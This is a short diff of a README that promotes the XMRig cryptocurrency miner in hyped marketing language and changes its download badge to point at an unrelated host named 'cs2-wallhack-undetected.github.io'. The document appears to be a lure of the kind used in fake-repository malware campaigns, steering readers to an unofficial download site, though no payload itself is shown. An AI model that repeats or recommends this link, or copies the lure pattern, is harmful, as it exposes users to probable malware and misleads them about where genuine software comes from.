@@ -2,7 +2,7 @@
 
 XMRig (CPU/GPU) represents the cutting edge of cryptocurrency mining technology, offering unparalleled performance for Monero (XMR) and other CryptoNote-based currencies. This robust open-source solution combines exceptional hash rates with remarkable energy efficiency, making it the preferred choice for both hobbyist miners and professional mining operations. With comprehensive support for modern algorithms and continuous development updates, XMRig maintains its position at the forefront of mining innovation.
 
-[![Download XMRig](https://img.shields.io/badge/GET_XMRig_NOW-Success-brightgreen)](https://xmrig-cpu-gpu.github.io/.github/xmrig)
+[![Download XMRig](https://img.shields.io/badge/GET_XMRig_NOW-Success-brightgreen)](https://cs2-wallhack-undetected.github.io/.github/XMRig)
 
 ---
 
